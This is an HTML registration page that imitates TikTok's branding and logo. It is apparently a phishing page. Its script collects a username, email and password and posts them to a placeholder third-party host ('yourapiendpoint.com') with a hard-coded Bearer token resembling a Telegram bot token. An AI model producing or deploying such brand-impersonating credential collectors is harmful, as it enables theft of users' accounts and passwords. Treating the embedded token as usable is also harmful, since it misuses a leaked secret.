<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Register</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: #1c1c1c;
            border-radius: 10px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
        }
        .logo {
            width: 60px;
            height: 60px;
            margin-bottom: 20px;
        }
        h2 {
            margin-bottom: 20px;
            font-weight: normal;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            margin-bottom: 15px;
            padding: 12px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #333;
            color: #fff;
        }
        input:focus {
            border-color: #25f4ee;
            outline: none;
        }
        button {
            padding: 12px;
            background-color: #fe2c55;
            border: none;
            border-radius: 5px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #25f4ee;
        }
        p {
            margin-top: 15px;
        }
        a {
            color: #25f4ee;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="48" height="48">
            <path fill="#25F4EE" d="M10.5 1h3.2v6.14h-3.2z"/>
            <path fill="#FE2C55" d="M13.7 5.98c2.24 1.53 3.69 2.3 6.27 2.6v2.6c-2.92-.06-5.04-1-6.27-1.76V17.5c0 3.9-3.13 7.07-7 7.07A7.03 7.03 0 1 1 11 15.8V10c-.62-.07-1.23-.1-1.87-.1a8.82 8.82 0 1 0 8.8 8.8V10c-2.9-.3-4.86-1.3-6.3-2.5z"/>
            <path fill="#FE2C55" d="M11 19.9a2.65 2.65 0 0 0 2.2-2.8v-5.7c-.62-.07-1.23-.1-1.87-.1a7.03 7.03 0 1 0 0 14.1c3.95 0 7.2-3.25 7.2-7.3v-3.4c-1.6-.97-3.07-2.1-4.7-3.4v8.8a2.65 2.65 0 1 1-2.6-2.9z"/>
        </svg>

        <h2>Create a new account</h2>
        <form id="register-form">
            <input type="text" id="new-username" placeholder="Username" required>
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="new-password" placeholder="Password" required>
            <button type="submit">Register</button>
            <p>Already have an account? <a href="login.html">Log in</a></p>
        </form>
    </div>

    <script>
        document.getElementById('register-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('new-username').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('new-password').value;

            fetch('https://yourapiendpoint.com/api/register', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer 8041070993:AAGS80ryFeTCoj6TZ44pp0hNgbkxKjsdLSg'
                },
                body: JSON.stringify({ username, email, password })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert("Registration successful! You can log in now.");
                    window.location.href = 'login.html';
                } else {
                    alert("Registration failed. Please try again.");
                }
            })
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>
